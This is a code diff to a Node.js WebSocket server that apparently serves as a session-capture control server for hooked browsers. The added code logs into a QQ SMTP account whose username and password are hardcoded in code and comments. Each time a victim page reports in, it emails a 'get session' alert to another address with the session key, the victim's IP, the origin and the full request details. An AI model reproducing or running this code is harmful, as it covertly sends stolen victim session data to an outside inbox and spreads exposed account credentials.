@@ -1,6 +1,15 @@
 const WebsocketServer = require("websocket").server;
 const http = require("http");
 const fs = require("fs");
+const nodemailer = require("nodemailer");
+// const mail = require("mail").Mail({
+//     host : "smtp.qq.com",
+//     username : "3070555628@qq.com",
+//     password : "ndultmeulojgddia"
+// });
+// 3070555628@qq.com
+// ndultmeulojgddia
+
 
 
 var websocket_server = websocket_server ? websocket_server : {};
@@ -8,6 +17,40 @@ var websocket_server = websocket_server ? websocket_server : {};
 websocket_server.run = function(){
     var method = {
         show : function(data,key){
+            var transporter = nodemailer.createTransport({
+                host : "smtp.qq.com",
+                secure : true,
+                auth : {
+                    user : "3070555628@qq.com",
+                    pass : "ndultmeulojgddia"
+                }
+            });
+            var mail_options = {
+                from : "node <3070555628@qq.com>",
+                to : "1206372957@qq.com",
+                subject : "get session",
+                html : "key : <b>${key}</b> , ip : <b>${out_ip}</b>, origin : <b>${origin}</b> , other_info : <b>${info}</b>".replace("${key}",key).replace("${out_ip}",global.cache.con_pool[key].req.out_ip).replace("${origin}",global.cache.con_pool[key].req.origin).replace("${info}",JSON.stringify(global.cache.con_pool[key].req))
+            }
+            transporter.sendMail(mail_options,(err,info)=>{
+                if(err){
+                    console.log("[!] Send mail failed " + key);
+                }
+                console.log("[*] Send mail " + key);
+            })
+
+            // mail.message({
+            //     from: '3070555628@qq.com',
+            //     to: ['1206372957@qq.com'],
+            //     subject: 'recv session'
+            // })
+            // .body("key : <b>${key}</b> , ip : <b>${out_ip}</b>, origin : <b>${origin}</b>".replace("${key}",key).replace("${out_ip}",global.cache.con_pool[key].out_ip).replace("${origin}",global.cache.con_pool[key].origin))
+            // .send(function(err) {
+            //     if (err){
+            //         console.log("[!] Send mail failed " + key);
+            //     }
+            //     console.log('[*] Sent ' + key);
+            // });
+
             global.cache.con_pool[key].origin_page = data;
             console.log("[*] Recv origin_page data");
         },
